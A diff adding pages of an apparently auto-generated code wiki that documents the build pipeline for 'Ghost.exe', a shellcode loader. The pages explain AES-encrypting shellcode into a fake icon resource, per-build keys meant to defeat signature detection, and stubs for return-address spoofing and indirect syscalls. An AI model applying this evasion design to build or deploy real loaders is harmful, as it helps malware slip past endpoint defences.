+<li>To study a single evasion primitive (the most self-contained place to start), read <a href="#page-10">return address spoofing</a> or <a href="#page-5">ETW patching</a>.</li>
+</ul>
+</article><article class="wiki-page" id="page-14"><div class="page-label">PAGE 14 · workflows/build-and-deploy.md</div><hr>
+<p>type: workflow
+title: Build &amp; Deployment Workflow (build.py)
+description: The cross-compilation pipeline that turns a raw x64 shellcode .bin into Ghost.exe — generating a fresh AES key/IV, encrypting the shellcode into icon.ico, patching those arrays into Ghost.cpp, and linking the NASM, resource, and MinGW objects into a single Windows executable on Linux.
+tags: [build, cross-compile, mingw, nasm, windres, aes-encryption, resources, deployment]
+verified:</p>
+<ul>
+<li>by: openwiki/0.5.0
+at: 2026-09-03T03:10:44.817Z
+sources:</li>
+<li>id: openwiki-source-e0fa2003814e1fa147c561c8
+resource: repo://build.py</li>
+<li>id: openwiki-source-23775c3de52f3ab95a13cb8b
+resource: repo://README.md</li>
+<li>id: openwiki-source-41a9d90bce8783b40d1ac50c
+resource: repo://Resource.rc</li>
+<li>id: openwiki-source-623cbff6c7e51d628ceced79
+resource: repo://resource1.h</li>
+<li>id: openwiki-source-554731dccd1cc779d1043b8d
+resource: repo://retaddrspoof.asm</li>
+<li>id: openwiki-source-28a2ba913c2f3cb2e3abbe21
+resource: repo://syscalls.asm
+generated: { by: &quot;openwiki/0.5.0&quot;, at: &quot;2026-09-03T03:10:44.817Z&quot; }</li>
+</ul>
+<hr>
+<h1>Build &amp; Deployment Workflow (build.py)</h1>
+<p><code>build.py</code> is the automated builder that converts a raw x64 shellcode <code>.bin</code> file into a deployable <code>Ghost.exe</code>. It is the only way the loader is produced: it generates a per-build AES key/IV, encrypts the shellcode into an <code>.ico</code> file, patches the key/IV into <code>Ghost.cpp</code>, compiles the C++ and the two NASM stubs, compiles the Win32 resource, and links everything into <code>Ghost.exe</code> — all on Linux using the MinGW cross-toolchain.</p>
+<p>The build script deliberately does <strong>not</strong> run on Windows. It requires Python 3, <code>pycryptodome</code>, the MinGW cross-compiler (<code>x86_64-w64-mingw32-g++</code>), the MinGW <code>windres</code>, and NASM.</p>
+<h2>Toolchain and key constants</h2>
+<p>The script hardcodes the host toolchain paths and compile/link flags at the top of <code>build.py</code> so a future user can adjust them in one place:</p>
+<ul>
+<li><code>WINDRES = &quot;/usr/bin/x86_64-w64-mingw32-windres&quot;</code></li>
+<li><code>NASM = &quot;/usr/bin/nasm&quot;</code></li>
+<li><code>MinGW = &quot;/usr/bin/x86_64-w64-mingw32-g++&quot;</code></li>
+<li><code>MinGW_FLAGS</code> = <code>-fmerge-all-constants -fexpensive-optimizations -finline-functions -fno-stack-protector -fno-unroll-loops -fno-exceptions -fno-rtti -Wpointer-arith -fpermissive -w -static-libgcc -static-libstdc++</code></li>
+<li><code>MinGW_LINK_FLAGS</code> = same base flags plus <code>-flto -s -Wl,--gc-sections -Wl,--strip-all</code> (i.e. link-time optimization, strip symbols, and section garbage collection).</li>
+</ul>
+<p>The crucial difference is that <code>MinGW_LINK_FLAGS</code> adds <code>-flto</code>, <code>-s</code>, <code>--gc-sections</code>, and <code>--strip-all</code> to the object-compile flags, so the final <code>Ghost.exe</code> is stripped and dead code is removed at link time.</p>
+<p>All intermediate artifacts are written to a <code>$CUR_DIR/build</code> folder, which the script creates if it does not already exist (with a <code>[BUILD]</code> log line either way).</p>
+<h2>Usage</h2>
+<pre><code class="language-bash">python3 build.py --shellcode shellcode.bin
+# or, equivalently
+python3 build.py -i shellcode.bin
+</code></pre>
+<p><code>--shellcode</code> (alias <code>-i</code>) is the only required argument; the raw x64 shellcode binary is passed on the command line. The README confirms the canonical invocation is <code>python3 build.py -i shellcode.bin</code>.</p>
+<h2>Pipeline</h2>
+<p>The <code>main</code> block runs the five stages in a fixed order:</p>
+<div class="mermaid pending">flowchart TD
+    A[&quot;build_assembly()&quot;] --&gt; B[&quot;prepare_src_shellcode()&quot;]
+    B --&gt; C[&quot;build_resource()&quot;]
+    C --&gt; D[&quot;build_cpp_src()&quot;]
+    D --&gt; E[&quot;link()&quot;]
+</div>
+<p><em>The five build stages of <code>build.py</code>, executed in sequence from the <code>__main__</code> block.</em></p>
+<div class="mermaid pending">flowchart TD
+    ra[&quot;retaddrspoof.asm&quot;] --&gt; nasm[&quot;NASM -f win64&quot;]
+    sa[&quot;syscalls.asm&quot;] --&gt; nasm
+    nasm --&gt; ro[&quot;build/retaddrspoof.o&quot;]
+    nasm --&gt; so[&quot;build/syscalls.o&quot;]
+
+    sc[&quot;shellcode.bin (raw x64)&quot;] --&gt; aes[&quot;prepare_src_shellcode: aes_encrypt (AES-256-CBC + random 32B key + 16B IV)&quot;]
+    aes --&gt; ico[&quot;icon.ico (ciphertext)&quot;]
+    aes --&gt; gpatch[&quot;regex-substitute AesKey/AesIv into Ghost.cpp&quot;]
+
+    ico --&gt; rc[&quot;Resource.rc: IDR_RCDATA1 RCDATA icon.ico&quot;]
+    rc --&gt; wr[&quot;windres -i Resource.rc&quot;]
+    wr --&gt; reso[&quot;build/Resource.o&quot;]
+
+    gpatch --&gt; gcpp[&quot;Ghost.cpp&quot;]
+    gcpp --&gt; mingw[&quot;MinGW g++ -c MinGW_FLAGS&quot;]
+    mingw --&gt; go[&quot;build/Ghost.o&quot;]
+
+    ro --&gt; link[&quot;link(): MinGW LINK_FLAGS&quot;]
+    so --&gt; link
+    reso --&gt; link
+    go --&gt; link
+    link --&gt; exe[&quot;build/Ghost.exe&quot;]
+</div>
+<p><em>Full build pipeline: NASM compiles the two assembly stubs, the shellcode is AES-encrypted into icon.ico and its key/IV injected into Ghost.cpp, windres compiles the resource, MinGW compiles the C++, and link() combines all four objects into Ghost.exe.</em></p>
+<h3>1. build_assembly() — NASM stubs</h3>
+<p><code>build_assembly()</code> runs NASM twice, once per assembly stub, in <code>-f win64</code> format:</p>
+<pre><code class="language-bash">nasm -f win64 retaddrspoof.asm -o build/retaddrspoof.o
+nasm -f win64 syscalls.asm -o build/syscalls.o
+</code></pre>
+<p>Both files are declared NASM-only (they each begin with &quot;NOT MASM, this file is in NASM syntax and can only be assembled with NASM assembler&quot;). <code>retaddrspoof.asm</code> exports <code>RetSpoofCall</code> (the ROP-gadget return-address-spoofing wrapper used throughout the loader), while <code>syscalls.asm</code> exports the indirect syscall trampolines <code>SysNtCreateUserProcess</code>, <code>SysNtReadVirtualMemory</code>, <code>SysNtProtectVirtualMemory</code>, and <code>SysNtTerminateProcess</code>. Each NASM invocation captures stderr; if either produces any stderr output the script prints the failing command and <code>exit()</code>s immediately.</p>
+<h3>2. prepare_src_shellcode() — encrypt and inject key/IV</h3>
+<p><code>prepare_src_shellcode()</code> does the encryption and source patching:</p>
+<ol>
+<li><code>do_aes(SHELLCODE)</code> reads the raw shellcode <code>.bin</code> and calls <code>aes_encrypt(data)</code>.</li>
+<li><code>aes_encrypt()</code> generates a <strong>fresh random 32-byte AES key</strong> (<code>generate_random_key(32)</code>, 256-bit) and a <strong>fresh random 16-byte IV</strong> (<code>generate_random_key(16)</code>, 128-bit), then encrypts with <strong>AES-256-CBC</strong> using <code>Crypto.Cipher.AES</code> with PKCS7 padding (<code>pad(data, AES.block_size)</code>).</li>
+<li>The ciphertext is written to <strong><code>icon.ico</code></strong> in the repo root.</li>
+<li>The key/IV are formatted as <code>unsigned char AesKey[] = { 0x.., ... };</code> and <code>unsigned char AesIv[] = { ... };</code> C array initializers.</li>
+<li><code>Ghost.cpp</code> is read, and two regexes (<code>unsigned char AesKey\[\] = \{.*?\};</code> and <code>unsigned char AesIv\[\] = \{.*?\};</code>) substitute the newly generated arrays into the source. The patched source is written back over <code>Ghost.cpp</code>.</li>
+</ol>
+<p>This is the mechanism that makes the per-build AES credentials unique and keeps the key from being a static signature.</p>
+<h3>3. build_resource() — compile the Win32 resource</h3>
+<p><code>build_resource()</code> runs windres on the resource script:</p>
+<pre><code class="language-bash">x86_64-w64-mingw32-windres -i Resource.rc -o build/Resource.o
+</code></pre>
+<p><code>Resource.rc</code> includes <code>resource1.h</code> (which defines <code>IDR_RCDATA1 101</code>) and declares <code>IDR_RCDATA1 RCDATA &quot;icon.ico&quot;</code>. Because <code>prepare_src_shellcode()</code> wrote the encrypted shellcode into <code>icon.ico</code>, compiling this resource embeds the ciphertext into the executable as a resource that Windows presents as an icon — part of the on-disk evasion strategy. At runtime the loader retrieves these bytes via <code>FindResourceW</code>/<code>RT_RCDATA</code> and decrypts them (see <a href="#page-11">shellcode-encryption-and-hiding</a>).</p>
+<h3>4. build_cpp_src() — compile the C++ loader</h3>
+<p><code>build_cpp_src()</code> compiles the patched <code>Ghost.cpp</code> with the MinGW cross-compiler:</p>
+<pre><code class="language-bash">x86_64-w64-mingw32-g++ -c Ghost.cpp MinGW_FLAGS -o build/Ghost.o
+</code></pre>
+<p>This produces <code>build/Ghost.o</code> from the single translation unit that now carries the freshly injected <code>AesKey</code>/<code>AesIv</code>.</p>
+<h3>5. link() — produce Ghost.exe</h3>
+<p><code>link()</code> links all four objects into the final executable:</p>
+<pre><code class="language-bash">x86_64-w64-mingw32-g++ build/syscalls.o build/retaddrspoof.o build/Resource.o build/Ghost.o MinGW_LINK_FLAGS -o build/Ghost.exe
+</code></pre>
+<p>The link step applies the link-only flags (<code>-flto</code>, <code>-s</code>, <code>--gc-sections</code>, <code>--strip-all</code>) and emits <code>build/Ghost.exe</code>.</p>
+<h2>Failure semantics and validation</h2>
+<ul>
+<li>There are <strong>no tests</strong>. The script&#39;s only validation is capturing each subprocess&#39;s <code>stderr</code>.</li>
+<li>Every stage runs its tool with <code>stdout</code> suppressed (<code>stdout=subprocess.DEVNULL</code>) and <code>stderr</code> captured (<code>stderr=subprocess.PIPE</code>), then checks <code>if (cmd.stderr:</code>.</li>
+<li>On any non-empty stderr, the script prints an <code>[ERROR]</code> line, prints the exact command that was used (the <code>[i] command used:</code> line), and calls <code>exit()</code> immediately — halting the build at the first failure stage and preserving the complete failure output for diagnosis.</li>
+<li>Each stage is a hard prerequisite for the next: assembly objects must exist before linking, the resource must embed the fresh <code>icon.ico</code>, and <code>Ghost.cpp</code> must carry the key/IV that encrypted that <code>icon.ico</code> in the same build. Because of this ordering, a failure at any stage stops the build before a mismatched or incomplete executable can be produced.</li>
+</ul>
+<h2>Operations and deployment notes</h2>
+<ul>
+<li><strong>Host Linux only.</strong> The builder relies on absolute <code>/usr/bin/</code> paths for the MinGW compiler, <code>windres</code>, and <code>nasm</code>, and on <code>python3</code> + <code>pycryptodome</code> — it will not run on Windows.</li>
+<li><strong>The embedded <code>.ico</code> is intentional.</strong> The encrypted shellcode is stored as an icon resource (<code>IDR_RCDATA1 RCDATA &quot;icon.ico&quot;</code>), matching the loader&#39;s <code>RT_RCDATA</code> extraction at runtime. This is a deliberate evasion: the on-disk artifact presents as an icon while carrying ciphertext.</li>
+<li><strong>Per-build key/IV.</strong> Because <code>prepare_src_shellcode()</code> regenerates the AES key and IV and rewrites <code>Ghost.cpp</code> on every run, no static key persists across builds, defeating signature-based detection of a fixed credential.</li>
+<li><strong>Outputs.</strong> <code>build/Ghost.exe</code> is the deployable artifact; <code>build/retaddrspoof.o</code>, <code>build/syscalls.o</code>, <code>build/Resource.o</code>, and <code>build/Ghost.o</code> are intermediate objects, and <code>icon.ico</code> is the (overwritten per build) embedded ciphertext source.</li>
+</ul>
+<h2>Relationships</h2>
+<ul>
+<li><a href="#page-2">loader-pipeline</a> — the runtime flow of the <code>Ghost.exe</code> this script produces; the embedded ciphertext is what <code>main()</code> decrypts at startup.</li>
+<li><a href="#page-11">shellcode-encryption-and-hiding</a> — the build-time encryption/embedding half and its runtime counterpart (<code>GetFromRc</code> + <code>AESDecrypt</code>).</li>
+<li><a href="#page-10">return-address-spoofing</a> — <code>retaddrspoof.asm</code> compiled by <code>build_assembly()</code> provides the <code>RetSpoofCall</code> wrapper.</li>
+<li><a href="#page-8">indirect-syscalls</a> — <code>syscalls.asm</code> compiled by <code>build_assembly()</code> provides the indirect syscall trampolines.</li>
+</ul>
+</article><article class="wiki-page" id="page-15"><div class="page-label">PAGE 15 · workflows/index.md</div><h1>Files</h1>
+<ul>
+<li><a href="#page-14">Build &amp; Deployment Workflow (build.py)</a> - The cross-compilation pipeline that turns a raw x64 shellcode .bin into Ghost.exe — generating a fresh AES key/IV, encrypting the shellcode into icon.ico, patching those arrays into Ghost.cpp, and linking the NASM, resource, and MinGW objects into a single Windows executable on Linux.</li>
+</ul>
+</article></section>
+  </main>
+</div>
+<script src="assets/mermaid.min.js"></script>
+  <script src="assets/site.js"></script>
+</body>
+</html>
